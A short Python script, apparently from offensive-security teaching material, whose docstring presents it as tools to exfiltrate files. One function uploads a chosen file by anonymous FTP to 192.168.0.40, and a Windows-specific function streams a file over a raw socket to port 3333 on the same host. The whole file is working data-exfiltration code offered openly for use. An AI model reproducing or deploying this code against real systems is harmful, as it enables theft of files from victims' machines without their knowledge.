'''
This script contains 2 basic functions to exfiltrate files to a remote server using basic file transfer techniques.
'''

import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.0.40'):      # 'docpath' is the path to a file we want to transfer to the server
    ftp = ftplib.FTP(server)                                        # connect to the server
    ftp.login("anonymous", "anonymous@example.com")                 # login to the server
    ftp.cwd('/pub/')                                                # navigate to the appropriate remote directory
    ftp.storbinary('STOR ' + os.path.basename(docpath), open(docpath, 'rb'), 1024)          # writing the target file to the remote server
    ftp.quit()

def transmit(document_path):                        # Windows specific file transmission
    client = socket.socket()                        # create a socket
    client.connect(('192.168.0.40', 3333))          # connect to the listener
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')       # transmit the file over the established channel

if __name__ == "__main__":
    transmit('test.txt')